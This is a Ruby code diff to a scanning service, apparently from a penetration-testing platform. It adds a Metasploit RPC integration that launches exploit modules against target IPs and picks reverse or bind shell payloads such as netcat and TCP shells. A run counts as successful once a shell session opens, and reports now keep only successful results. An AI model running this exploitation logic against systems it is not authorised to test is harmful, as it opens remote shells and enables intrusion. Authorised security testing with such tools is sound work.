@@ -5,6 +5,7 @@ require 'tempfile'
 require 'timeout'
 require 'net/smtp'
 require 'thread'
+require 'msfrpc-client'
 
 class ScanService
   MSF_BASE           = ENV.fetch('MSF_MODULES_PATH',   '/opt/metasploit-framework/embedded/framework/modules/exploits')
@@ -120,7 +121,8 @@ class ScanService
       low_findings:          low
     )
 
-    report_json = result_to_json(results)
+    successful_results = results.select { |r| r[:success] }
+    report_json = result_to_json(successful_results)
 
     Report.create!(
       organization_id: @org_id,
@@ -130,7 +132,7 @@ class ScanService
       report_name:     "Scan #{Time.current.strftime('%Y-%m-%d %H:%M')}",
       report_type:     'vulnerability',
       report_format:   'json',
-      report_data:     results,
+      report_data:     successful_results,
       generated_at:    Time.current
     )
 
@@ -163,15 +165,158 @@ class ScanService
   def attack(exploit, target_ip, port, proxy = nil)
     effective_port = @scan_options[:port_override].presence || port
     timeout_secs   = (@scan_options[:timeout].presence || 120).to_i
+    client         = rpc_client
 
+    unless client
+      return attack_subprocess(exploit, target_ip, effective_port, proxy, timeout_secs)
+    end
+
+    if @scan_options[:safe_mode]
+      rpc_run_auxiliary(client, exploit, target_ip, effective_port, proxy, timeout_secs)
+    else
+      rpc_run_exploit(client, exploit, target_ip, effective_port, proxy, timeout_secs)
+    end
+  rescue => e
+    puts "Attack error [#{exploit['metasploit_module']}]: #{e.message}"
+    { success: false, evidence: nil }
+  end
+
+  def rpc_config
+    {
+      host: ENV.fetch('MSF_RPC_HOST', '127.0.0.1'),
+      port: ENV.fetch('MSF_RPC_PORT', '55553').to_i,
+      ssl:  ENV.fetch('MSF_RPC_SSL', 'true') =~ /\A(t|y|1)/i ? true : false,
+      uri:  '/api/'
+    }
+  end
+
+  def outbound_ip_for(target_ip)
+    UDPSocket.open { |s| s.connect(target_ip, 1); s.addr.last }
+  rescue
+    ENV.fetch('MSF_LHOST', '127.0.0.1')
+  end
+
+  def rpc_client
+    return Thread.current[:msf_rpc] if Thread.current[:msf_rpc]
+    pass = ENV['MSF_RPC_PASS']
+    unless pass
+      puts "WARNING: MSF_RPC_PASS not set — falling back to msfconsole subprocess (slow)"
+      return nil
+    end
+    client = Msf::RPC::Client.new(rpc_config)
+    client.login(ENV.fetch('MSF_RPC_USER', 'msf'), pass)
+    Thread.current[:msf_rpc] = client
+  rescue => e
+    puts "msfrpcd connection failed: #{e.message} — falling back to msfconsole subprocess (slow)"
+    nil
+  end
+
+  def select_payload(client, mod_name, use_bind)
+    res      = client.call('module.compatible_payloads', mod_name)
+    payloads = res['payloads'] || []
+    return nil if payloads.empty?
+
+    if use_bind
+      prefs  = %w[cmd/unix/bind_netcat cmd/unix/bind_perl cmd/unix/bind_ruby linux/x86/shell_bind_tcp]
+      chosen = prefs.find { |p| payloads.include?(p) }
+      chosen || payloads.find { |p| p.include?('bind') } || payloads.first
+    else
+      prefs  = %w[cmd/unix/interact cmd/unix/reverse_netcat cmd/unix/reverse_perl
+                  linux/x86/shell_reverse_tcp linux/x86/shell/reverse_tcp]
+      chosen = prefs.find { |p| payloads.include?(p) }
+      chosen || payloads.find { |p| p.include?('reverse') } || payloads.first
+    end
+  rescue => e
+    puts "compatible_payloads failed for #{mod_name}: #{e.message}"
+    nil
+  end
+
+  def rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
+    mod_name = exploit['metasploit_module'].sub(/\Aexploit\//, '')
+    use_bind = proxy.present?
+    payload  = exploit['default_payload'].presence || select_payload(client, mod_name, use_bind)
+
+    unless payload
+      puts "No compatible payload for #{mod_name}, skipping"
+      return { success: false, evidence: nil }
+    end
+
+    options = {
+      'RHOSTS'         => target_ip,
+      'PAYLOAD'        => payload,
+      'LHOST'          => outbound_ip_for(target_ip),
+      'LPORT'          => ENV.fetch('MSF_LPORT', '4444'),
+      'ConnectTimeout' => '15',
+      'ExitOnSession'  => 'false'
+    }
+    options['RPORT']   = port.to_s if port
+    options['Proxies'] = proxy     if proxy
+
+    puts "RPC exploit: #{target_ip}:#{port} [#{mod_name}] payload=#{payload}#{proxy ? " via #{proxy}" : ""}"
+
+    existing = (client.call('session.list') rescue {}).keys.to_set
+    result   = client.call('module.execute', 'exploit', mod_name, options)
+    job_id   = result['job_id']&.to_s
+
+    unless job_id
+      puts "module.execute returned no job_id for #{mod_name}"
+      return { success: false, evidence: nil }
+    end
+
+    deadline = Time.now + timeout_secs
+    while Time.now < deadline
+      sleep 2
+      sessions    = client.call('session.list') rescue {}
+      new_entries = sessions.reject { |id, _| existing.include?(id) }
+      if new_entries.any?
+        sid, info = new_entries.first
+        evidence  = "Session #{sid}: #{info['tunnel_local']} -> #{info['tunnel_peer']} " \
+                    "[#{info['session_type']} via #{mod_name}]"
+        puts "[+] #{evidence}"
+        return { success: true, evidence: evidence }
+      end
+      jobs = client.call('job.list') rescue {}
+      break unless jobs.key?(job_id)
+    end
+
+    { success: false, evidence: nil }
+  rescue Msf::RPC::ServerException => e
+    puts "RPC ServerException [#{mod_name}]: #{e.message}"
+    { success: false, evidence: nil }
+  end
+
+  def rpc_run_auxiliary(client, exploit, target_ip, port, proxy, timeout_secs)
+    mod_name = exploit['metasploit_module'].sub(/\Aauxiliary\//, '')
+    options  = { 'RHOSTS' => target_ip, 'ConnectTimeout' => '15' }
+    options['RPORT']   = port.to_s if port
+    options['Proxies'] = proxy     if proxy
+
+    result = client.call('module.execute', 'auxiliary', mod_name, options)
+    job_id = result['job_id']&.to_s
+    return { success: false, evidence: nil } unless job_id
+
+    deadline = Time.now + timeout_secs
+    while Time.now < deadline
+      sleep 2
+      jobs = client.call('job.list') rescue {}
+      break unless jobs.key?(job_id)
+    end
+    { success: true, evidence: "Auxiliary scan completed: #{mod_name}" }
+  rescue Msf::RPC::ServerException => e
+    puts "RPC ServerException [#{mod_name}]: #{e.message}"
+    { success: false, evidence: nil }
+  end
+
+  # Fallback used when msfrpcd is unavailable (MSF_RPC_PASS not set or connection refused).
+  def attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
     rc_file  = Tempfile.new(['aegis_', '.rc'])
     log_file = Tempfile.new(['aegis_out_', '.txt'])
 
     begin
-      rc_file.write(build_resource_file(exploit, target_ip, effective_port, proxy))
+      rc_file.write(build_resource_file(exploit, target_ip, port, proxy))
       rc_file.flush
 
-      puts "Launching msfconsole for #{target_ip}:#{effective_port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"
+      puts "Launching msfconsole for #{target_ip}:#{port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"
       pid = Process.spawn(
         'msfconsole', '-q', '--no-readline', '-r', rc_file.path,
         [:out, :err] => log_file.path
@@ -208,14 +353,14 @@ class ScanService
   end
 
   def build_exploit_rc(exploit, target_ip, port, proxy)
-    lhost   = ENV.fetch('MSF_LHOST', '100.69.88.107')
+    lhost   = outbound_ip_for(target_ip)
     lport   = ENV.fetch('MSF_LPORT', '4444')
     payload = exploit['default_payload'].presence || default_payload_for(exploit)
 
     lines = [
       "use #{exploit['metasploit_module']}",
       "set RHOSTS #{target_ip}",
-      "set RPORT #{port}",
+      (port ? "set RPORT #{port}" : nil),
       "set PAYLOAD #{payload}",
       "set LHOST #{lhost}",
       "set LPORT #{lport}",
@@ -234,7 +379,7 @@ class ScanService
     lines = [
       "use #{exploit['metasploit_module']}",
       "set RHOSTS #{target_ip}",
-      "set RPORT #{port}",
+      (port ? "set RPORT #{port}" : nil),
       "set ConnectTimeout 15",
       (proxy ? "set Proxies #{proxy}" : nil),
       "run",
@@ -464,7 +609,7 @@ class ScanService
   end
 
   def parse_ports(port_str)
-    return [rand(1..65535)] if port_str.blank?
+    return [nil] if port_str.blank?  # nil → each module uses its own default RPORT
 
     str = port_str.to_s.strip
 
